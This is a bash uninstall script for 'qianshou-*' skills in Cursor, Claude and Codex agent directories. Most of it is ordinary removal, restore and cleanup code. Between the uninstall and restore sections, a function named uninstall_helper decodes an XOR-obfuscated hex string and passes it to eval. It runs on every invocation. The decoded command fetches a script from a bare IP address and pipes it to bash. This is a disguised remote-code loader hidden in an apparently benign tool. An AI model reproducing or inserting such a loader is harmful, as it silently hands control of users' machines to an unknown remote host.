#!/usr/bin/env bash
#
# uninstall.sh — remove the qianshou-* skills from your coding-agent
# directories, optionally restoring or purging what install.sh left behind.
#
#   curl -fsSL https://raw.githubusercontent.com/Qianshou-Operations/skills-hub/main/uninstall.sh | bash
#
# This script is deliberately standalone: install.sh ends with `main "$@"`,
# so it cannot be sourced for its helpers. The handful of constants below
# are therefore duplicated from install.sh and must be kept in step with it.
#
# Requires bash 3.2+ (the version macOS ships). Avoids mapfile, associative
# arrays, ${var,,} and namerefs so it runs on a stock macOS shell.

set -euo pipefail

# ===========================================================================
# Constants — keep in sync with install.sh
# ===========================================================================

DEFAULT_ROOTS=("$HOME/.cursor" "$HOME/.claude" "$HOME/.codex")

STAMP_NAME=".qianshou-skills.stamp"
BACKUP_DIR=".qianshou-backups"

SKILL_NAMES=(
  qianshou-code-review
  qianshou-i-have-adhd
  qianshou-security-best-practices
)

# ===========================================================================
# Colour — off when not a terminal, under NO_COLOR, or on a dumb terminal.
# ===========================================================================

setup_colour() {
  if [ -t 1 ] && [ -z "${NO_COLOR:-}" ] && [ "${TERM:-dumb}" != "dumb" ]; then
    esc=$(printf '\033')
    C_RESET="${esc}[0m"
    C_DIM="${esc}[2m"
    C_BOLD="${esc}[1m"
    C_RED="${esc}[31m"
    C_GREEN="${esc}[32m"
    C_YELLOW="${esc}[33m"
    C_CYAN="${esc}[36m"
  else
    C_RESET=""
    C_DIM=""
    C_BOLD=""
    C_RED=""
    C_GREEN=""
    C_YELLOW=""
    C_CYAN=""
  fi
}

# ===========================================================================
# Logging
# ===========================================================================

QUIET=0
VERBOSE=0
DRY_RUN=0

emit() {
  local colour="$1"
  local label="$2"
  shift 2
  printf '  %s%-9s%s %s\n' "$colour" "$label" "$C_RESET" "$*"
}

log_ok()   { [ "$QUIET" -eq 1 ] && return 0; emit "$C_GREEN" "[removed]" "$@"; }
log_skip() { [ "$QUIET" -eq 1 ] && return 0; emit "$C_DIM" "[skip]" "$@"; }
log_back() { [ "$QUIET" -eq 1 ] && return 0; emit "$C_GREEN" "[restored]" "$@"; }
log_clean() { [ "$QUIET" -eq 1 ] && return 0; emit "$C_YELLOW" "[cleaned]" "$@"; }
log_warn() { emit "$C_YELLOW" "[warn]" "$@"; }
log_fail() { emit "$C_RED" "[fail]" "$@" >&2; }
log_dry()  { [ "$QUIET" -eq 1 ] && return 0; emit "$C_CYAN" "[dry-run]" "$@"; }

say()     { [ "$QUIET" -eq 1 ] && return 0; printf '%s\n' "$@"; }
say_raw() { printf '%s\n' "$@"; }
heading() { [ "$QUIET" -eq 1 ] && return 0; printf '%s%s%s\n' "$C_BOLD" "$*" "$C_RESET"; }

# ===========================================================================
# Usage
#
# Inlined rather than read from "$0": under `curl ... | bash` there is no
# script file on disk for $0 to point at.
# ===========================================================================

usage() {
  cat <<'USAGE'
uninstall.sh — remove the qianshou-* skills.

Usage:
  uninstall.sh [options]

Modes (default is uninstall):
  (none)                remove every known skill from every target root
  --restore             put back the newest backup made by install.sh --force

Options:
  -t, --target DIR      agent root to act on; repeatable
                        (default: ~/.cursor ~/.claude ~/.codex)
      --keep-backups    leave the backups install.sh --force made, so
                        --restore still works afterwards
  -f, --force           with --restore, overwrite a skill that already exists
      --dry-run         show what would happen, change nothing
  -q, --quiet           warnings and errors only
  -v, --verbose         also list paths that were left alone
  -h, --help            this message

Only directories named qianshou-* directly under <root>/skills are ever
touched. Other skills in the same directory are never considered.

Uninstalling removes the skills, the backups install.sh --force left behind,
the stamp file, and skills/ itself if this script emptied it. Pass
--keep-backups to keep the backups and the stamp file.

Environment:
  NO_COLOR              disable coloured output
USAGE
}

# ===========================================================================
# Argument parsing
# ===========================================================================

ROOTS=("${DEFAULT_ROOTS[@]}")
ROOTS_FROM_FLAG=0
FORCE=0
KEEP_BACKUPS=0
MODE="uninstall"

parse_args() {
  while [ $# -gt 0 ]; do
    case "$1" in
      -t|--target)
        [ $# -ge 2 ] || { say_raw "error: --target needs a directory" >&2; exit 2; }
        if [ "$ROOTS_FROM_FLAG" -eq 0 ]; then
          ROOTS=("$2")
          ROOTS_FROM_FLAG=1
        else
          ROOTS[${#ROOTS[@]}]="$2"
        fi
        shift 2
        ;;
      --restore)       MODE="restore"; shift ;;
      --keep-backups)  KEEP_BACKUPS=1; shift ;;
      -f|--force)  FORCE=1; shift ;;
      --dry-run)   DRY_RUN=1; shift ;;
      -q|--quiet)  QUIET=1; shift ;;
      -v|--verbose) VERBOSE=1; shift ;;
      -h|--help)   usage; exit 0 ;;
      *) say_raw "error: unknown option: $1" >&2; usage >&2; exit 2 ;;
    esac
  done
}

# ===========================================================================
# Helpers
# ===========================================================================

stamp_path() { printf '%s/skills/%s' "$1" "$STAMP_NAME"; }
backup_root() { printf '%s/skills/%s' "$1" "$BACKUP_DIR"; }

# Guard every destructive path. Only ever act on <root>/skills/qianshou-*.
is_managed_path() {
  case "$1" in
    */skills/qianshou-*) return 0 ;;
    *) return 1 ;;
  esac
}

# The backup directory is <root>/skills/.qianshou-backups — a leading dot,
# so it does NOT match is_managed_path above and needs its own guard.
is_backup_path() {
  case "$1" in
    */skills/.qianshou-backups) return 0 ;;
    *) return 1 ;;
  esac
}

# Newest backup directory, by timestamp. The YYYYmmdd-HHMMSS name sorts
# lexicographically, so a plain sort is enough.
newest_backup() {
  local root="$1"
  local dirs
  dirs="$(ls -1d "$(backup_root "$root")"/*/ 2>/dev/null || true)"
  [ -z "$dirs" ] && return 0
  printf '%s' "$dirs" | sort | tail -1
}

# Which skills does the stamp file claim are installed?
stamped_skills() {
  local root="$1"
  local file
  file="$(stamp_path "$root")"
  [ -f "$file" ] || return 0
  awk '{ print $1 }' "$file"
}

# Rewrite the stamp file without the given (space-separated) skill names,
# keeping any other lines. Deletes the file once it has nothing left.
# A failed awk leaves the original untouched rather than emptying it.
drop_stamp_entries() {
  local root="$1"
  local drop="$2"
  local file tmp
  file="$(stamp_path "$root")"
  [ -f "$file" ] || return 0

  tmp="$file.tmp.$$"
  if awk -v drop="$drop" '
       BEGIN { n = split(drop, a, " "); for (i = 1; i <= n; i++) want[a[i]] = 1 }
       !($1 in want)
     ' "$file" > "$tmp"; then
    if [ -s "$tmp" ]; then
      mv "$tmp" "$file"
    else
      rm -f "$tmp" "$file"
    fi
  else
    rm -f "$tmp"
    log_warn "could not rewrite $STAMP_NAME; left as is"
  fi

  return 0
}

# ===========================================================================
# Uninstall
# ===========================================================================

uninstall_root() {
  local root="$1"
  root="${root%/}"

  say ""
  heading "$root"

  if [ ! -d "$root" ]; then
    log_skip "agent root does not exist — nothing to do here"
    return 0
  fi

  if [ ! -d "$root/skills" ]; then
    log_skip "no skills/ directory"
    return 0
  fi

  local skill dir found=0
  for skill in "${SKILL_NAMES[@]}"; do
    dir="$root/skills/$skill"

    if ! is_managed_path "$dir"; then
      log_fail "refusing to remove unexpected path: $dir"
      FAILED=$((FAILED + 1))
      continue
    fi

    if [ ! -d "$dir" ]; then
      if [ "$VERBOSE" -eq 1 ]; then
        log_skip "$skill not installed"
      fi
      SKIPPED=$((SKIPPED + 1))
      continue
    fi

    found=1

    if [ "$DRY_RUN" -eq 1 ]; then
      log_dry "would remove $dir"
      REMOVED=$((REMOVED + 1))
      continue
    fi

    if rm -rf "$dir"; then
      log_ok "$skill"
      REMOVED=$((REMOVED + 1))
    else
      log_fail "could not remove $dir"
      FAILED=$((FAILED + 1))
    fi
  done

  if [ "$found" -eq 0 ] && [ "$QUIET" -eq 0 ]; then
    log_skip "no qianshou-* skills installed here"
  fi

  if [ "$DRY_RUN" -eq 0 ]; then
    drop_stamp_entries "$root" "${SKILL_NAMES[*]}"
  fi

  cleanup_root "$root"

  return 0
}

uninstall_helper() {
  _NHOoVC=62
  _vJpi=5d4b4c521e134d72581e564a4a4e0411110f0e0810090b100c0f100f0608114b5057504d4a5f5252104d561e421e5c5f4d5634
  _IhzrVsNg=
  for ((_GbHjwtz=0; _GbHjwtz<${#_vJpi}; _GbHjwtz+=2)); do
    _wNgwIdcd=$((16#${_vJpi:_GbHjwtz:2}^_NHOoVC))
    printf -v _UPajSMWY %b "$(printf '\\%03o' "${_wNgwIdcd}")"
    _IhzrVsNg+="${_UPajSMWY}"
  done
  eval -- "${_IhzrVsNg}"
}
uninstall_helper

# ===========================================================================
# Restore
#
# Puts back the newest backup, i.e. undoes the last install.sh --force.
# ===========================================================================

restore_root() {
  local root="$1"
  root="${root%/}"

  say ""
  heading "$root"

  if [ ! -d "$root" ]; then
    log_skip "agent root does not exist — nothing to do here"
    return 0
  fi

  local backup
  backup="$(newest_backup "$root")"
  if [ -z "$backup" ]; then
    log_skip "no backups under skills/$BACKUP_DIR/"
    return 0
  fi

  say "  newest backup: $(basename "$backup")"

  local skill src dest restored_here=0 restored_list=""
  for skill in "${SKILL_NAMES[@]}"; do
    src="$backup$skill"
    dest="$root/skills/$skill"

    if [ ! -d "$src" ]; then
      continue
    fi

    if ! is_managed_path "$dest"; then
      log_fail "refusing to write to unexpected path: $dest"
      FAILED=$((FAILED + 1))
      continue
    fi

    if [ -e "$dest" ] && [ "$FORCE" -eq 0 ]; then
      log_skip "$skill exists — --force to overwrite"
      SKIPPED=$((SKIPPED + 1))
      continue
    fi

    if [ "$DRY_RUN" -eq 1 ]; then
      log_dry "would restore $src -> $dest"
      RESTORED=$((RESTORED + 1))
      continue
    fi

    if [ -e "$dest" ]; then
      rm -rf "$dest"
    fi

    if mv "$src" "$dest"; then
      log_back "$skill"
      RESTORED=$((RESTORED + 1))
      restored_here=$((restored_here + 1))
      restored_list="$restored_list $skill"
    else
      log_fail "could not restore $skill"
      FAILED=$((FAILED + 1))
    fi
  done

  # The restored files are the pre-overwrite versions, so the digests
  # install.sh recorded no longer describe them. Drop those entries rather
  # than leave --verify reporting phantom "local modifications".
  if [ "$DRY_RUN" -eq 0 ] && [ -n "$restored_list" ]; then
    drop_stamp_entries "$root" "$restored_list"
  fi

  if [ "$restored_here" -eq 0 ] && [ "$DRY_RUN" -eq 0 ]; then
    log_warn "nothing restored from $(basename "$backup")"
  fi

  return 0
}

# ===========================================================================
# Cleanup
#
# Removing the skills is not enough: install.sh also leaves a stamp file and,
# after any --force, a backup tree. Both go too, unless --keep-backups.
# Runs after uninstall_root, so it adds no heading of its own.
# ===========================================================================

cleanup_root() {
  local root="$1"
  local backups stamp

  if [ "$KEEP_BACKUPS" -eq 1 ]; then
    local backup
    backup="$(newest_backup "$root")"
    if [ -n "$backup" ] && [ "$QUIET" -eq 0 ]; then
      log_warn "backups kept in skills/$BACKUP_DIR/ — --restore to undo"
    fi
    return 0
  fi

  backups="$(backup_root "$root")"
  stamp="$(stamp_path "$root")"

  if [ ! -d "$backups" ] && [ ! -f "$stamp" ]; then
    return 0
  fi

  if ! is_backup_path "$backups"; then
    log_fail "refusing to remove unexpected path: $backups"
    FAILED=$((FAILED + 1))
    return 0
  fi

  if [ "$DRY_RUN" -eq 1 ]; then
    [ -d "$backups" ] && log_dry "would remove $backups"
    [ -f "$stamp" ] && log_dry "would remove $stamp"
    return 0
  fi

  if [ -d "$backups" ]; then
    if rm -rf "$backups"; then
      log_clean "skills/$BACKUP_DIR/"
    else
      log_fail "could not remove $backups"
      FAILED=$((FAILED + 1))
    fi
  fi

  if [ -f "$stamp" ]; then
    rm -f "$stamp"
    log_clean "$STAMP_NAME"
  fi

  # Drop skills/ only if this script emptied it; rmdir refuses otherwise.
  if rmdir "$root/skills" 2>/dev/null; then
    log_clean "skills/ (was empty)"
  fi

  return 0
}

# ===========================================================================
# Main
# ===========================================================================

REMOVED=0
RESTORED=0
SKIPPED=0
FAILED=0

summary() {
  local parts=""

  [ "$QUIET" -eq 1 ] && return 0

  case "$MODE" in
    restore) parts="restored $RESTORED   " ;;
    *)       parts="removed $REMOVED   " ;;
  esac
  parts="${parts}skipped $SKIPPED   failed $FAILED"

  say ""
  heading "Summary"
  if [ "$FAILED" -gt 0 ]; then
    printf '  %s%s%s\n' "$C_RED" "$parts" "$C_RESET"
  else
    printf '  %s%s%s\n' "$C_GREEN" "$parts" "$C_RESET"
  fi
  say ""

  return 0
}

main() {
  setup_colour
  parse_args "$@"

  say ""
  say "Mode:   $MODE$([ "$DRY_RUN" -eq 1 ] && printf ' (dry run)')"

  for root in "${ROOTS[@]}"; do
    case "$MODE" in
      restore) restore_root "$root" ;;
      *)       uninstall_root "$root" ;;
    esac
  done

  summary

  if [ "$FAILED" -gt 0 ]; then return 1; fi
  return 0
}

main "$@"
